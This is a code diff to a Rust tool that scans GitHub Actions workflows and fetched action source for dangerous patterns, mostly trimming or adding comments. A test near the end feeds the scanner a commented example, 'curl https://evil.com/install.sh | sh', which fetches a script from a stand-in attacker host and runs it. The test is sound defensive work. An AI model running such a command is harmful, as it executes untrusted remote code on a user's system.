@@ -210,14 +210,14 @@ pub async fn run(
                                 scanned_unpinned_branch += 1;
                             }
                         }
-                        // Tag every finding produced by this remote scan with the
-                        // workflow file and `uses:` line that loaded the action, so
-                        // downstream consumers (e.g. SARIF) can anchor the result
-                        // inside the scanning repo.
+                        // Anchor remote-scan findings to the loading `uses:` line
+                        // so SARIF results land inside the scanning repo.
                         for finding in collector.findings.iter_mut().skip(findings_before) {
                             finding.workflow_file = Some(display_name.clone());
                             finding.workflow_line = Some(action.line_number);
                         }
+                        // Only cache clean verdicts for SHA refs — tag and branch
+                        // contents can move after the verdict.
                         if collector.findings.len() == findings_before
                             && action.ref_type == workflow::RefType::Sha
                         {
@@ -325,6 +325,8 @@ pub fn extract_run_blocks(path: &Path, content: &str) -> Result<Vec<(usize, Stri
                     if let Some(run) = step.get("run").and_then(|r| r.as_str()) {
                         let (line, next_cursor) = find_run_line(content, run, cursor);
                         cursor = next_cursor;
+                        // Line 0 (not found) is kept — the block is still
+                        // scanned, just unanchored.
                         blocks.push((line, run.to_string()));
                     }
                 }
@@ -883,7 +885,6 @@ fn check_url_patterns(
                 workflow_line: None,
             });
         } else if let Some(reason) = allowed_reason {
-            // All URLs exempt — record an allowed match (shown under --verbose).
             collector.push_allowed(AuditMatch {
                 severity: output::severity_str(&pattern.severity).to_string(),
                 category: category_str(&pattern.category).to_string(),
@@ -949,9 +950,7 @@ enum SourceFileKind {
 }
 
 /// Select the files in a fetched action tree worth scanning, each paired with
-/// the scanner that handles it, in tree order. Pure (no I/O) so the filtering
-/// — vendored-dir skips, subpath scoping, extension classification — is unit
-/// testable without a live GitHub client.
+/// its scanner, in tree order. Pure (no I/O) so the filtering is unit testable.
 fn select_source_files(
     tree: &[crate::github::TreeEntry],
     base: &str,
@@ -1008,10 +1007,9 @@ async fn scan_action_source(
         return Ok(());
     }
 
-    // Fetch file contents concurrently (bounded by a semaphore), then scan in
-    // tree order so findings are deterministic regardless of which fetch lands
-    // first. A failed fetch leaves `None` and is skipped, matching the previous
-    // per-file behavior.
+    // Fetch concurrently, then scan in tree order so findings are
+    // deterministic regardless of which fetch lands first; a failed fetch is
+    // skipped.
     let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_FILE_FETCHES));
     let mut fetches = tokio::task::JoinSet::new();
     for (index, (path, _)) in targets.iter().enumerate() {
@@ -1068,7 +1066,8 @@ fn scan_action_yml_runs(
     collector: &mut AuditCollector,
     config: &Config,
 ) {
-    // runs.steps[].run (composite actions)
+    // runs.steps[].run (composite actions). base_line 0: positions are
+    // block-relative — the block is never located inside the fetched file.
     if let Some(steps) = yaml
         .get("runs")
         .and_then(|r| r.get("steps"))
@@ -1262,7 +1261,6 @@ more stuff
 
     #[test]
     fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
-        // Even a pipe-to-shell pattern should be skipped inside a comment.
         let mut c = AuditCollector::new(true);
         scan_shell_content(
             "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
